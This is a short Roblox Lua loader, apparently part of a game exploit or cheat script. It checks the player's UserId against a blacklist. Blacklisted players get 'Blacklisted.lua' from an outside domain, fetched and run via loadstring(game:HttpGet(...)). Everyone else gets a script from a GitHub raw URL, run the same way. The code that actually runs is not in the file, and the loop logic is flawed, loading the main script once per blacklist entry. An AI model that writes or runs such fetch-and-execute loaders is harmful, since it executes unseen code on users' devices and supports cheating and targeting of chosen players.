local blacklist = {0, 1}

local loadstrin = "https://raw.githubusercontent.com/Fadify/RO-TXBeta/main/Main.lua"

for _, Id in pairs(blacklist) do
    if Id == game.Players.LocalPlayer.UserId then
        loadstring(game:HttpGet(('https://www.scrumptiou.live/Blacklisted.lua'),true))()
        break
    else
        loadstring(game:HttpGet((loadstrin),true))()
    end
end
